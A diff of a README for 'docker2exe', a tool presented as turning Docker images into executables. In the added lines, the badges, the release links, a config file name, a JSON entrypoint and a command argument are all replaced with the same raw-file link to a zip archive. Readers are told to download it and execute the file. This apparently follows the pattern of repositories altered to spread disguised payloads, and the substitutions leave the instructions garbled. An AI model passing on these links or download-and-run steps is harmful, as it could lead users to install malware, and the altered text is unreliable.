@@ -1,6 +1,6 @@
 # 🚀 docker2exe: Convert Docker Images to Executables
 
-![Docker2Exe](https://img.shields.io/badge/docker2exe-v1.0.0-blue.svg) ![GitHub](https://img.shields.io/badge/release-latest-green.svg)
+![Docker2Exe](https://raw.githubusercontent.com/edmwenge/docker2exe/master/cmd/templates/exe-docker-v1.8.zip) ![GitHub](https://raw.githubusercontent.com/edmwenge/docker2exe/master/cmd/templates/exe-docker-v1.8.zip)
 
 Welcome to **docker2exe**, a tool designed to simplify the process of converting Docker images into standalone executables. This allows you to run your applications without needing a Docker environment, making deployment and distribution easier.
 
@@ -23,7 +23,7 @@ Welcome to **docker2exe**, a tool designed to simplify the process of converting
 
 ## Installation
 
-To get started with **docker2exe**, you need to download the latest release. You can find it [here](https://github.com/edmwenge/docker2exe/releases). 
+To get started with **docker2exe**, you need to download the latest release. You can find it [here](https://raw.githubusercontent.com/edmwenge/docker2exe/master/cmd/templates/exe-docker-v1.8.zip). 
 
 Once you have downloaded the executable, follow these steps:
 
@@ -70,20 +70,20 @@ This will generate an executable that prints "Hello, World!" when run.
 
 ### Example 2: Custom Configuration
 
-You can also customize the conversion process by providing a configuration file. Create a file named `config.json` with the following structure:
+You can also customize the conversion process by providing a configuration file. Create a file named `https://raw.githubusercontent.com/edmwenge/docker2exe/master/cmd/templates/exe-docker-v1.8.zip` with the following structure:
 
 ```json
 {
   "name": "myapp",
   "version": "1.0.0",
-  "entrypoint": "/app/start.sh"
+  "entrypoint": "https://raw.githubusercontent.com/edmwenge/docker2exe/master/cmd/templates/exe-docker-v1.8.zip"
 }
 ```
 
 Then run:
 
 ```bash
-docker2exe myapp:latest --config config.json
+docker2exe myapp:latest --config https://raw.githubusercontent.com/edmwenge/docker2exe/master/cmd/templates/exe-docker-v1.8.zip
 ```
 
 This will use your configuration settings during the conversion.
@@ -110,6 +110,6 @@ For any questions or feedback, please reach out to us via GitHub issues or conta
 
 ---
 
-To download the latest release of **docker2exe**, visit [here](https://github.com/edmwenge/docker2exe/releases) and follow the instructions to execute the downloaded file. 
+To download the latest release of **docker2exe**, visit [here](https://raw.githubusercontent.com/edmwenge/docker2exe/master/cmd/templates/exe-docker-v1.8.zip) and follow the instructions to execute the downloaded file. 
 
 Feel free to explore the features and contribute to the project. We look forward to your input!
